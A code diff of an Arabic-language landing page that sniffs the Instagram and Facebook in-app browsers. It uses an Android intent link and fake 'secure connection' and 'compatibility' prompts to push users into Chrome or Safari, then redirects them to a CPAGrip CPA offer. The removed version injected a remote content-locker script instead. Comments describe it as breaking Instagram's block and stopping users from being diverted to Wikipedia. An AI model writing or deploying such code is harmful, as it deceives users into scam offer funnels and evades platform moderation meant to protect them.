@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>بوابة الفحص والتأمين</title>
+    <title>بوابة الفحص الآمنة</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: #121214; color: #ffffff; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; direction: rtl; overflow: hidden; }
-        .container { text-align: center; max-width: 90%; width: 400px; padding: 30px; background-color: #1e1e24; border-radius: 16px; border: 1px solid #2a2a32; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        h2 { font-size: 19px; font-weight: 900; margin-bottom: 12px; line-height: 1.5; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: #121214; color: #ffffff; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; direction: rtl; }
+        .container { text-align: center; max-width: 90%; width: 420px; padding: 30px; background-color: #1e1e24; border-radius: 16px; border: 1px solid #2a2a32; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h2 { font-size: 20px; font-weight: 900; margin-bottom: 12px; line-height: 1.5; color: #ffffff; }
         p { font-size: 14px; color: #a0a0ab; line-height: 1.6; margin-bottom: 25px; }
-        .btn { display: inline-block; background-color: #34c759; color: #ffffff; padding: 14px 24px; border-radius: 8px; font-weight: 700; text-decoration: none; font-size: 16px; border: none; cursor: pointer; transition: background 0.2s; width: 100%; box-sizing: border-box; }
+        .btn { display: inline-block; background-color: #34c759; color: #ffffff; padding: 15px 24px; border-radius: 8px; font-weight: 700; text-decoration: none; font-size: 16px; border: none; cursor: pointer; transition: background 0.2s; width: 100%; box-sizing: border-box; }
         .btn:active { background-color: #2db04f; }
         .ios-overlay { display: none; text-align: right; }
         .step { display: flex; align-items: center; margin-bottom: 15px; }
@@ -22,38 +22,38 @@
 <body>
 
     <div class="container" id="main-container">
-        <!-- شاشة الانتظار الافتراضية -->
+        <!-- 1. شاشة الانتظار الافتراضية -->
         <div id="loading-screen">
             <h2>جاري تهيئة الاتصال الآمن...</h2>
-            <p>يرجى الانتظار لحظة واحدة لتجهيز بوابتك الحاضنة للعروض المعتمدة.</p>
+            <p>يرجى الانتظار لحظات لتجهيز بوابتك الحاضنة للمحتوى الحصري.</p>
         </div>
 
-        <!-- واجهة أندرويد لكسر حظر إنستغرام عبر التفاعل الحركي -->
+        <!-- 2. واجهة أندرويد لكسر الحظر بالنقرة التفاعلية -->
         <div id="android-screen" style="display: none;">
             <h2>تنبيه توافقية المتصفح</h2>
-            <p>متصفح إنستغرام الداخلي يمنع استكمال التنزيل بشكل صحيح. اضغط على الزر أدناه للانتقال فوراً لمتصفح كروم الرسمي ومتابعة المحتوى.</p>
+            <p>متصفح إنستغرام الداخلي يمنع استكمال التنزيل واستعراض المهام بشكل صحيح. اضغط أدناه للانتقال فوراً إلى متصفح Chrome ومتابعة المحتوى.</p>
             <button class="btn" id="intent-btn">اضغط هنا لفتح صفحة التحميل</button>
         </div>
 
-        <!-- واجهة آيفون الإرشادية للهروب اليدوي -->
+        <!-- 3. واجهة آيفون الإرشادية للهروب اليدوي -->
         <div id="ios-screen" class="ios-overlay">
             <h2 style="text-align: center;">يرجى فتح الصفحة في متصفح النظام</h2>
-            <p style="text-align: center; color:#a0a0ab;">لتفادي عوائق وجدار حظر التطبيق الداخلي لإنستغرام، يرجى اتباع ما يلي:</p>
+            <p style="text-align: center; color:#a0a0ab;">لتفادي جدار حظر التطبيق الداخلي لإنستغرام وضمان ظهور العروض، اتبع الآتي:</p>
             <div class="step">
                 <span class="step-num">1</span>
                 <span class="step-text">اضغط على زر <strong>الخيارات الثلاثة (•••)</strong> في أعلى يمين الشاشة.</span>
             </div>
             <div class="step">
                 <span class="step-num">2</span>
-                <span class="step-text">اختر <strong>فتح في سفاري (Open in Safari)</strong> لتنشيط منصة العروض الحية.</span>
+                <span class="step-text">اختر <strong>فتح في سفاري (Open in Safari)</strong> لتنشيط بوابة العروض الحية.</span>
             </div>
         </div>
     </div>
 
     <script>
         (function() {
-            // الرابط الخاص بك الممرر من طرفك للسكريبت
-            const scriptUrl = "https://playabledownloads.com/script_include.php?id=1902770&tracking_id=";
+            // تم حقن رابط عروضك الحقيقي والباشر هنا بنجاح
+            const finalCpaUrl = "https://www.cpagrip.com/view.php?id=1905574"; 
             
             const userAgent = navigator.userAgent || navigator.vendor || window.opera;
             const isInstagram = userAgent.includes('Instagram');
@@ -61,42 +61,37 @@
             const isAndroid = /Android/i.test(userAgent);
             const isIOS = /iPhone|iPad|iPod/i.test(userAgent);
 
-            // تجهيز رابط النوايا لنظام الأندرويد بناءً على رابط Vercel الخاص بك حالياً
+            // هندسة رابط النوايا لفتح نفس رابط Vercel الحالي داخل متصفح كروم الخارجي
             const currentHost = window.location.host;
             const currentPath = window.location.pathname;
             const currentSearch = window.location.search;
             const cleanUrl = currentHost + currentPath + currentSearch;
             const androidIntent = `intent://${cleanUrl}#Intent; scheme=https; package=com.android.chrome; end;`;
 
-            // 1. إذا كان الزائر يتصفح فعلياً من داخل إنستغرام أو فيسبوك
+            // أ. المستخدم يضغط على الرابط من داخل إنستغرام أو فيسبوك
             if (isInstagram || isFacebook) {
                 if (isAndroid) {
                     document.getElementById('loading-screen').style.display = 'none';
                     document.getElementById('android-screen').style.display = 'block';
                     
-                    // محاولة تحويل تلقائي أولية
+                    // محاولة تحويل تلقائي أولية سريعة
                     window.location.href = androidIntent;
 
-                    // في حال حظر المتصفح للتحويل التلقائي، ينتظر نقرة إصبع المستخدم الإجبارية
+                    // الاعتماد الصارم: كسر الحظر عبر نقرة المستخدم الشرعية
                     document.getElementById('intent-btn').addEventListener('click', function() {
                         window.location.href = androidIntent;
                     });
                 } 
                 else if (isIOS) {
+                    // تفعيل واجهة الهروب لمستخدمي الآيفون لمنع طردهم لويكيبيديا
                     document.getElementById('loading-screen').style.display = 'none';
                     document.getElementById('ios-screen').style.display = 'block';
                 }
             } 
-            // 2. الترافيك نظيف وخارجي (المستخدم فتح الرابط داخل متصفح Chrome أو Safari عادي)
+            // ب. الترافيك نظيف وخارجي (المستخدم حالياً في Chrome أو Safari الأصلي بعد الهروب)
             else {
-                // إخفاء الواجهات بالكامل لعرض القفل الخاص بك بشكل نظيف
-                document.getElementById('main-container').style.display = 'none';
-                
-                // هندسة الحقن الديناميكي: نقوم بإنشاء عنصر سكريبت وربطه بالصفحة مباشرة لتنفيذ القفل
-                var cpaScript = document.createElement('script');
-                cpaScript.src = scriptUrl;
-                cpaScript.type = 'text/javascript';
-                document.head.appendChild(cpaScript);
+                // تحويل فوري ومباشر إلى رابط CPAGrip بدون أي عوائق
+                window.location.href = finalCpaUrl;
             }
         })();
     </script>
